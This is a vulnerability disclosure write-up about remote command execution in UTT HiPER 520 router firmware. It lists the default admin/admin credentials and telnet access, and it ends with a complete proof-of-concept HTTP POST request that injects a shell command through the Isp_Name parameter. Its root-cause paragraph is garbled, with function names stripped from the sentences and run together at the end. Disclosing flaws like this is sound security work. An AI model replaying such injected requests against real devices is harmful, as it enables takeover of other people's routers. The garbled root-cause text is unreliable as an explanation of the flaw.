# Remote Command Execution (RCE) in UTT HiPER 520
Product supplier: UTT Supplier 
website: UTT-Professional router, switch, firewall brand Affected 
product: HiPER 520 
Firmware version affected: nv520v3v1.7.7-160105 
Firmware download address: UTT AITAI - professional router, switch, firewall brand
<img width="939" height="226" alt="image" src="https://github.com/user-attachments/assets/ab4f3ea0-9819-4ed7-8e3f-aeda7f04be5b" />

# Root Cause Analysis
The vulnerability exists in the function within the binary. 
The application retrieves the parameter via . 
Although it attempts to convert the input to an integer using , 
it mistakenly uses the original unsanitized string pointer in a subsequent call.sub_44EFB4 rehttpdIsp_NamewebsGetVarstrtoldoSystem
<img width="992" height="524" alt="image" src="https://github.com/user-attachments/assets/35f7df3e-bf34-4fc8-9da6-297abe1c5fb1" />

# Vulnerable Code Snippet:
<img width="1188" height="658" alt="image" src="https://github.com/user-attachments/assets/8c2eefe6-bfeb-4ca1-b382-644af1c4f330" />

# Reproduction Process
First, use telnetd to get a shell and observe the behavior telnet 192.168.1.1 60023 The login username and password are admin/admin
<img width="1126" height="593" alt="image" src="https://github.com/user-attachments/assets/f1ab2845-af43-41a9-b2f1-7c55de0e1916" />

let's go to the http://192.168.1.1/WANConfig.asp page.
Click the button in the red box Then use Burp Suite to capture packets
<img width="1415" height="585" alt="image" src="https://github.com/user-attachments/assets/0109b722-fa55-48eb-9530-bc6c386fdb3e" />
Click the button in the red box Then use Burp Suite to capture packets
<img width="966" height="538" alt="image" src="https://github.com/user-attachments/assets/3acc8b2b-9b60-4b31-b4e2-fe56f7e443f6" />
Modify the data packet as follows
<img width="1533" height="933" alt="image" src="https://github.com/user-attachments/assets/308c8828-27c5-4c6c-8b1a-9eaa781c5f8d" />
We change that.
<img width="1540" height="850" alt="image" src="https://github.com/user-attachments/assets/df874d0b-6fd0-4978-b932-8d66da73d2ff" />
<img width="1133" height="723" alt="image" src="https://github.com/user-attachments/assets/fde53e61-7a14-465b-8890-3e87539de8c0" />
Command execution
```
POST /goform/formReleaseConnect HTTP/1.1
Host: 192.168.1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:147.0) Gecko/20100101 Firefox/147.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8,zh-HK;q=0.7,en-US;q=0.6,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 49
Origin: http://192.168.1.1
Authorization: Digest username="admin", realm="UTT", nonce="d727c2525213d29cfcc57e0c94d6dfda", uri="/goform/formReConnect", algorithm=MD5, response="2d18c3e70c8fb60d7e9dd2413cd4bc6d", opaque="5ccc069c403ebaf9f0171e9517f40e41", qop=auth, nc=0000004c, cnonce="15fbe72dc0004deb"
Connection: keep-alive
Referer: http://192.168.1.1/WANConfig.asp
Cookie: language=zhcn; utt_bw_rdevType=
Upgrade-Insecure-Requests: 1
Priority: u=0, i

delstr=&id=&Isp_Name=1;touch /tmp/nb666&Isp_Type=

```
